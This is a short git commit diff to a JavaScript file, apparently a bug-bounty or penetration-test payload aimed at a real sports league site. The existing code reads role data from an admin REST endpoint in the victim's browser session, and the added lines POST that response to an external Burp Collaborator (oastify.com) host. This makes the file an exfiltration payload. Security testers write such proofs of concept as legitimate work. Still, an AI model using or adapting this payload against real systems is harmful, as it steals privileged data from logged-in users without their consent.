3be2cba7f0f7c5e88c5c2a9fbd1ac8b6f7f7ddb0
reket99 <42685719+reket99@users.noreply.github.com>
2022-09-20 15:49:54 -0400

    Update b.js

--- b.js
+++ b.js
@@ -2,3 +2,9 @@ var req = new XMLHttpRequest();
 req.open('GET', 'https://link.nhl.com/iami/admin/rest/role?', false) 
 req.send();
 alert(req.responseText)
+
+var test = req.responseText
+
+var req1 = new XMLHttpRequest();
+req1.open('POST', 'https://srnz93binwceaer10iutivta3190xp.oastify.com', false) 
+req1.send(test);
